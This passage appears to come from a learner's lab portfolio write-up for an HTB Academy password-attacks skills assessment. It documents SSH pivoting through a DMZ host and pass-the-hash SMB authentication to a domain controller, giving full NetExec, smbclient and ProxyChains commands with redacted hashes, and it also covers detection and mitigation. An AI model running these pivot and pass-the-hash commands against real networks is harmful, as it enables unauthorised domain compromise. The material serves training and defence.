#### Verified Outcomes

- SSH authentication to DMZ01 succeeded.
- DMZ01's internal interface was identified.
- Internal network routing was confirmed.
- DC01 resolved to `172.16.119.11`.
- DMZ01 reached DC01 on TCP/445.
- SOCKS forwarding behavior was investigated.
- The terminated SSH tunnel was identified as one cause of failure.
- SSH local port forwarding was established.
- The forwarded SMB service responded.
- Samba SMBClient enumerated DC01 shares.
- NetExec authenticated the privileged domain account and reported `(Pwn3d!)`.

#### Outcomes Not Verified Locally

- Successful extraction of the domain Administrator hash.
- Successful replication of AD credential material.
- Completed NTDS dumping.
- Full compromise of every host in the assessment.
- Official acceptance of the submitted answer.

#### Evidence Requirements

The original conversation includes two screenshots of networking and SMB troubleshooting.

They have not been copied into the Kali website evidence directory.

The successful administrative SMB authentication is supported by real terminal output, but no screenshot of that final result is available.

The report must retain the classification `EVIDENCE PENDING` until the evidence requirements are satisfied.

### 11. Security Implications

#### DMZ-to-Internal Access

DMZ01 had a network interface directly connected to the internal domain subnet.

An authenticated operator on that host could reach the internal domain controller.

This illustrates why multihomed systems should be carefully assessed when defining trust boundaries.

#### Reusable Authentication Material

The successful use of an NT hash to authenticate demonstrates the security significance of exposed credential material.

An attacker does not always need a plaintext password to authenticate to an NTLM-enabled service.

#### Privileged Domain Access

NetExec identified administrative access for the tested domain account.

Accounts with extensive administrative privileges present a significant risk when their credentials are exposed.

#### Reporting Accuracy

Successful authentication to a domain controller and successful extraction of directory secrets are distinct findings.

A professional assessment must not report the latter solely because the former succeeded.

### 12. Defensive Perspective

#### Network Segmentation

Restrict unnecessary connections from DMZ hosts to domain controllers.

Apply host firewall rules and service-specific network access controls.

#### Privileged Account Protection

Limit standing domain-administrator privileges.

Use dedicated administrative accounts and enforce appropriate separation between user and privileged sessions.

Avoid exposing highly privileged reusable authentication material on shared systems.

#### Monitoring Opportunities

Potentially relevant Windows security events include:

- Event 4624: successful logon, including network logons.
- Event 4672: special privileges assigned to a new logon.
- Event 4662: directory-service object access, useful for investigating replication activity when appropriate auditing is configured.

Investigators should correlate host, account, source address, privileges, and activity timelines rather than interpreting a single event as proof of compromise.

#### Credential Access Detection

Monitor unusual access to LSASS memory.

Investigate unexpected credential extraction utilities and privileged authentication patterns.

Monitor directory replication operations and suspicious administrative activity against domain controllers.

#### SMB Security

Maintain supported SMB versions and enforce suitable authentication and integrity protections.

SMB signing protects message integrity but does not automatically prevent the use of valid stolen credentials.

### 13. Lessons Learned

The central troubleshooting lesson was that TCP reachability, protocol negotiation, and authentication must be tested separately.

The initial SOCKS failures included a terminated SSH session and later SMB-level timeouts.

Examining the listening process confirmed whether forwarding was active.

Testing the internal network from DMZ01 ruled out an incorrect domain-controller address.

Using SSH local port forwarding reduced the number of moving parts and enabled the learner to obtain a reliable SMB authentication result.

The reporting lesson was equally important: independent public references can corroborate a lab solution, but they must not replace authentic evidence of the learner's own actions.

### 14. References

- HTB Academy — Password Attacks: https://academy.hackthebox.com/course/preview/password-attacks
- jameskaois — Skills Assessment, Password Attacks: https://github.com/jameskaois/ctf-writeups/blob/main/cpts/10-password-attacks/26-skills-assessment-password-attacks.md
- MITRE ATT&CK T1003.001 — LSASS Memory: https://attack.mitre.org/techniques/T1003/001/
- MITRE ATT&CK T1003.006 — DCSync: https://attack.mitre.org/techniques/T1003/006/
- MITRE ATT&CK T1552.001 — Credentials in Files: https://attack.mitre.org/techniques/T1552/001/

### Retained module assessment observations

**Classification:** Documented Practice / Evidence Pending

#### Objective

The final assessment asked for the NTLM hash of `NEXURA\Administrator`.

#### Observed Environment

The external target was `ACADEMY-PWATTCK-SADMZ01`, running Ubuntu 20.04.6 LTS.

The learner authenticated over SSH and established that DMZ01 had two network interfaces:

```text
ens160  10.129.230.32/16
ens192  172.16.119.13/24
```

DNS resolution identified:

```text
dc01.nexura.htb -> 172.16.119.11
```

#### Initial SSH and SOCKS Pivot

The first method used SSH dynamic forwarding:

```bash
ssh -N -D 127.0.0.1:1080 jbetty@10.129.230.32
```

The learner configured ProxyChains to use the local SOCKS endpoint.

Initial SMB connections produced timeouts.

One SSH debug log demonstrated that the proxy had been established but was subsequently terminated using `Ctrl+C`.

This explained the loss of the local listening port.

**Authentic Screenshot E01:** Initial SSH and SMB timeout.

**Evidence Pending on Kali:** `image(20261102-155951).png`

#### Network Verification

After restoring SSH forwarding, the learner verified the SOCKS listener and TCP connectivity.

The domain controller was also reached directly from DMZ01 over TCP/445.

This established that DC01 was available on the internal subnet.

However, successful TCP tests did not consistently result in successful SMB negotiation through ProxyChains.

**Authentic Screenshot E02:** SOCKS connectivity and unsuccessful Impacket operation.

**Evidence Pending on Kali:** `image(20261102-160645).png`

#### SSH Local Port Forwarding

The learner then used a dedicated SSH local port forward:

```bash
ssh -N \
  -L 127.0.0.1:1445:172.16.119.11:445 \
  jbetty@10.129.230.32
```

A local netcat check confirmed TCP connectivity to port 1445.

This eliminated the ProxyChains dependency for the SMB-only authentication test.

#### SMB Share Enumeration

Samba SMBClient successfully authenticated using NTLM material provided during the assessment.

Its output included:

```text
ADMIN$      Disk  Remote Admin
C$          Disk  Default share
IPC$        IPC   Remote IPC
NETLOGON    Disk  Logon server share
SYSVOL      Disk  Logon server share
```

This demonstrated that the forwarded connection could perform actual SMB protocol operations.

#### Privileged Authentication

The learner subsequently used NetExec against the local forwarded SMB port.

The decisive original terminal output was:

```text
SMB 127.0.0.1 1445 DC01
Windows 10 / Server 2019 Build 17763
name: DC01
domain: nexura.htb
signing: True

[+] NEXURA.HTB\stom:<REDACTED> (Pwn3d!)
```

The result demonstrates successful privileged NTLM authentication to DC01.

The `(Pwn3d!)` indication was produced by NetExec and is supported by original user-supplied terminal text.

**Evidence Pending:** A screenshot showing this exact successful result.

#### Domain Administrator NTLM Verification

The domain Administrator NTLM hash was found and independently checked in a public community write-up.

The original learner transcript does not show a successful local NTDS extraction.

Consequently, the referenced Administrator hash is not represented as locally extracted evidence.

The public portfolio document intentionally omits the complete reusable hash.

#### Assessment Outcome

**Verified:** Internal host discovery, SSH forwarding, SMB share enumeration, privileged SMB authentication.

**Reference-supported:** Domain Administrator NTLM hash in an external write-up.

**Unverified locally:** Successful NTDS extraction and accepted assessment submission.

The final assessment should therefore be reported as documented practice with pending evidence, not as an entirely verified end-to-end domain compromise.

---

## Cross-Module Technical Findings

### 1. Password Quality and Offline Recovery

John the Ripper and Hashcat demonstrate why predictable passwords are vulnerable when stored verifiers or encrypted artifacts become available for offline analysis.

### 2. Authentication Material Is Broader Than Plaintext Passwords

NT hashes, Kerberos tickets, keytabs, cached credentials, and certificates may all enable authentication in specific circumstances.

### 3. Credential Storage Creates Attack Opportunities

SAM, LSASS, Credential Manager, application configuration files, browser data, network shares, and traffic captures are distinct sources of authentication-related evidence.

### 4. Network Reachability Does Not Prove Authentication

A successful TCP connection indicates transport-level reachability. It does not establish successful SMB negotiation, authentication, privileged access, or credential extraction.

### 5. Evidence Provenance Matters

A public write-up may corroborate an exercise answer, but it cannot be substituted for an original learner screenshot or terminal log.

## Defensive Detection and Mitigation

A robust defensive program should address password exposure across endpoints, servers, identity platforms, and network protocols.

Recommended controls include strong password hashing, unique credentials, MFA, restricted privileged access, careful DMZ segmentation, secret scanning, credential rotation, LSASS protections, secure SMB configurations, and constrained AD replication permissions.

Relevant monitoring sources include Windows Security logs, EDR telemetry, domain-controller authentication logs, process execution events, and carefully configured directory-service access auditing.

Credential misuse often produces related indicators across multiple hosts. Detection should correlate identity, source host, target host, authentication method, privileges, and observed follow-up activity.

## Final Learning Assessment

The available conversations provide substantial hands-on evidence across multiple Password Attacks sections, particularly password cracking, selected Windows credential-storage exercises, Active Directory authentication, credential hunting, and NEXURA pivoting.

Other sections are presently represented by learning notes or third-party write-up references.

This document covers all 26 sections, but it does not claim that all 26 practical exercises were independently verified or officially completed.

The appropriate publication state is:

**DOCUMENTED PRACTICE — EVIDENCE PENDING / REVIEW REQUIRED**

## References

1. HTB Academy — Password Attacks:
   https://academy.hackthebox.com/app/module/90

2. HTB Academy — Skills Assessment:
   https://academy.hackthebox.com/app/module/90/section/1559

3. HTB Academy — Password Attacks course description:
   https://academy.hackthebox.com/course/preview/password-attacks

4. Community section write-ups:
   https://github.com/jameskaois/ctf-writeups/tree/main/cpts/10-password-attacks

5. MITRE ATT&CK — OS Credential Dumping:
   https://attack.mitre.org/techniques/T1003/

6. MITRE ATT&CK — Pass the Hash:
   https://attack.mitre.org/techniques/T1550/002/

7. MITRE ATT&CK — Pass the Ticket:
   https://attack.mitre.org/techniques/T1550/003/

8. MITRE ATT&CK — DCSync:
   https://attack.mitre.org/techniques/T1003/006/

## Retained observations — Earlier field observations

### Earlier field observations — Scope of investigation

The module covers credential storage, authentication protocols, password attacks and weak credential practices. My recovered activity focuses on network services and Windows SMB. Full completion of every module section is not established.
### Earlier field observations — SMB laboratory observations

A Windows laboratory target accepted a provided training account. The tool subsequently reported privileged access and retrieved local SAM account hash data. The original password and hash values are intentionally removed from this public version.
```text
SMB  [lab-target]  [+] [lab-user]:[REDACTED] (Pwn3d!)
SMB  [lab-target]  [*] Dumping SAM hashes
SMB  [lab-target]  [REDACTED: local account hash output]
```
### Earlier field observations — Technical interpretation

Authentication success, administrative authorization and access to stored credentials are distinct conditions. Technical reports should identify precisely which security boundary was crossed and which observed outputs support that conclusion.
### Earlier field observations — Defensive takeaway

Reduce credential reuse, enforce strong authentication, restrict local administrator permissions, monitor suspicious remote logons and protect credential stores. Sensitive account data should not appear in public screenshots or write-ups.


## Retained observations — Earlier assessment serialization

### Earlier assessment serialization — NTDS and Domain Credential Extraction

```text
ssh -N -D 127.0.0.1:1080 jbetty@10.129.230.32
```
### Earlier assessment serialization — Active Directory

- Platform: HTB Pwnbox
- Linux distribution: Parrot OS
- Observed IP address: `10.10.15.97`
- Shells encountered: PowerShell on Linux and Bash
- ProxyChains-ng: 4.17
- NetExec: 1.5.1
- Impacket: 0.12.0
- Other utilities: OpenSSH, netcat, Samba SMBClient, iproute2
- Hostname: DMZ01
- Assessment identifier: ACADEMY-PWATTCK-SADMZ01
- Operating system: Ubuntu 20.04.6 LTS
- External interface: `ens160`
- External address: `10.129.230.32/16`
- Internal interface: `ens192`
- Internal address: `172.16.119.13/24`
- SSH account: `jbetty`
- Domain: `NEXURA.HTB`
- Domain controller: DC01
- Domain-controller address: `172.16.119.11`
- SMB service: TCP/445
- RPC Endpoint Mapper: TCP/135
- Privileged account tested: `NEXURA\stom`
### Earlier assessment serialization — 5.4 Direct SMB Reachability

```text
ssh jbetty@10.129.230.32

ip -br addr
ip route

lo      UNKNOWN  127.0.0.1/8
ens160  UP       10.129.230.32/16
ens192  UP       172.16.119.13/24

172.16.119.0/24 dev ens192 proto kernel scope link src 172.16.119.13

getent hosts dc01.nexura.htb

172.16.119.11 nexura.htb DC01 DC01.nexura.htb

nc -vz -w 5 172.16.119.11 445

Connection to 172.16.119.11 445 port [tcp/microsoft-ds] succeeded!
```
### Earlier assessment serialization — 6.3 Restoring Forwarding

```text
ssh -N -D 127.0.0.1:1080 \
  -o ExitOnForwardFailure=yes \
  jbetty@10.129.230.32

strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000

[ProxyList]
socks5 127.0.0.1 1080

Authenticated to 10.129.230.32 using "password".
Local forwarding listening on 127.0.0.1 port 1080.

^C
Killed by signal 2.

ss -lntp | grep ':1080'
nc -vz -w 3 127.0.0.1 1080

nc: connect to 127.0.0.1 port 1080 (tcp) failed: Connection refused

Strict chain ... 127.0.0.1:1080 ... 172.16.119.11:445 ... OK
Connection to 172.16.119.11 445 port [tcp/microsoft-ds] succeeded!
```
### Earlier assessment serialization — 7.3 Important Interpretation

```text
proxychains4 -f "$HOME/proxychains-nexura.conf" \
  netexec smb 172.16.119.11 \
  -u stom \
  -H '<REDACTED_NT_HASH>' \
  -d NEXURA.HTB \
  --no-smbv1 \
  --smb-timeout 25 \
  --timeout 30 \
  -t 1 \
  --debug

Creating SMBv3 connection to 172.16.119.11
Timeout creating SMBv3 connection to 172.16.119.11

RemoteOperations failed:
[Errno Connection error (172.16.119.11:445)] timed out
```
### Earlier assessment serialization — 8.4 Privileged Authentication With NetExec

```text
ssh -N \
  -L 127.0.0.1:1445:172.16.119.11:445 \
  -o ExitOnForwardFailure=yes \
  jbetty@10.129.230.32

HTB Pwnbox
    |
    | 127.0.0.1:1445
    v
SSH Tunnel
    |
    v
DMZ01 (10.129.230.32)
    |
    v
DC01 (172.16.119.11:445)

nc -vz -w 5 127.0.0.1 1445

Connection to 127.0.0.1 1445 port [tcp/*] succeeded!

smbclient -L //127.0.0.1 \
  -p 1445 \
  -W NEXURA \
  -U 'stom%<REDACTED_NT_HASH>' \
  --pw-nt-hash \
  -m SMB3 \
  -t 20

Sharename   Type   Comment
---------   ----   ------------------
ADMIN$      Disk   Remote Admin
C$          Disk   Default share
IPC$        IPC    Remote IPC
NETLOGON    Disk   Logon server share
SYSVOL      Disk   Logon server share

SMB1 disabled -- no workgroup available

netexec smb 127.0.0.1 \
  --port 1445 \
  -u stom \
  -H '<REDACTED_NT_HASH>' \
  -d NEXURA.HTB \
  --no-smbv1 \
  --smb-timeout 20 \
  -t 1

SMB 127.0.0.1 1445 DC01
Windows 10 / Server 2019 Build 17763
name: DC01
domain: nexura.htb
signing: True

[+] NEXURA.HTB\stom:<REDACTED> (Pwn3d!)
```
### Earlier assessment serialization — Evidence Requirements

- SSH authentication to DMZ01 succeeded.
- DMZ01's internal interface was identified.
- Internal network routing was confirmed.
- DC01 resolved to `172.16.119.11`.
- DMZ01 reached DC01 on TCP/445.
- SOCKS forwarding behavior was investigated.
- The terminated SSH tunnel was identified as one cause of failure.
- SSH local port forwarding was established.
- The forwarded SMB service responded.
- Samba SMBClient enumerated DC01 shares.
- NetExec authenticated the privileged domain account and reported `(Pwn3d!)`.
- Successful extraction of the domain Administrator hash.
- Successful replication of AD credential material.
- Completed NTDS dumping.
- Full compromise of every host in the assessment.
- Official acceptance of the submitted answer.
